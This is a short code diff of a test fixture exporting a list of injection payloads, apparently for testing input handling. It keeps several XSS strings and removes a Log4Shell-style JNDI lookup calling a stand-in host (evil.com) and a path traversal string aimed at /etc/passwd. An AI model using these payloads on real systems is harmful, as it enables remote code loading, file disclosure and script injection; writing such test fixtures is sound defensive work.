@@ -3,8 +3,6 @@ export const INJECTION_PAYLOADS = [
     'javascript:alert("xss")',
     '<img src="x" onerror="alert(1)">',
     '"><script>alert("xss")</script>',
-    '${jndi:ldap://evil.com/a}',
-    '../../../../../../etc/passwd'
 ];
 
 export const TEST_BOARD = {
